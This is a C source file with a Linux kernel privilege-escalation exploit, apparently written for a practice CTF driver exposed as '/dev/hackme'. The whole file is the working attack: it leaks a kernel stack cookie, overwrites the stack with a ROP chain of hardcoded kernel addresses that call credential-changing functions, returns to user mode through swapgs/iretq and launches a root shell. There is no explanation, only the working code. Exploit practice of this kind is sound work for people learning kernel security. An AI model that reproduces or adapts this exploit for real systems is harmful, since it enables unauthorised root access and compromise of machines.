#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

void get_shell(void) {
	char *arg[] = {"/bin/sh", NULL};
	char *env[] = {NULL};
	
	if(getuid() == 0) {
		printf("got dat root: %d\n", getuid());
		execve(arg[0], arg, env);
	} else {
		printf("aint got that root\n");
	}
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void escalate_privs(void) {
	__asm__(
		".intel_syntax noprefix;"
		"movabs rax, 0xffffffff814c67f0;"
		"xor rdi, rdi;"
		"call rax; mov rdi, rax;"
		"movabs rax, 0xffffffff814c6410;"
		"call rax;"
		"swapgs;"
		"mov r15, user_ss;"
		"push r15;"
		"mov r15, user_sp;"
		"push r15;"
		"mov r15, user_rflags;"
		"push r15;"
		"mov r15, user_cs;"
		"push r15;"
		"mov r15, user_rip;"
		"push r15;"
		"iretq;"
		".att_syntax;"
	);
}

void save_state() {
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
}


int main() {
	unsigned long leak[50];
	unsigned long payload[50];
	
	save_state();

	int fd = open("/dev/hackme", O_RDWR);
	if (fd < 0) {
		printf("failed to open\n");
		return -1;
	}
	

	ssize_t re = read(fd, leak, sizeof(leak));

	for(int i=0; i < 50;i++) {
		printf("leak #%d: %lx\n", i, leak[i]);
	}

	printf("stack cookie: %lx\n", leak[16]);
	
	printf("escalate_privs addr: %lx\n", (unsigned long)escalate_privs);	
	payload[16] = leak[16];
	payload[17] = 0x0;
	payload[18] = 0x0;
	payload[19] = 0x0;
	payload[20] = 0xffffffff81006370;
	payload[21] = 0x0;
	payload[22] = 0xffffffff814c67f0;
	payload[23] = 0xffffffff818c6eba;
	payload[24] = 0x0;
	payload[25] = 0xffffffff814c6410;
	payload[26] = 0xffffffff81200f10+0x16;
	payload[27] = 0x0;
	payload[28] = 0x0;
	payload[29] = (unsigned long)get_shell;
	payload[30] = user_cs;
	payload[31] = user_rflags;
	payload[32] = user_sp;
	payload[33] = user_ss;

	size_t wr = write(fd, payload, sizeof(payload));

	printf("testing!\n");
	return 0;
}
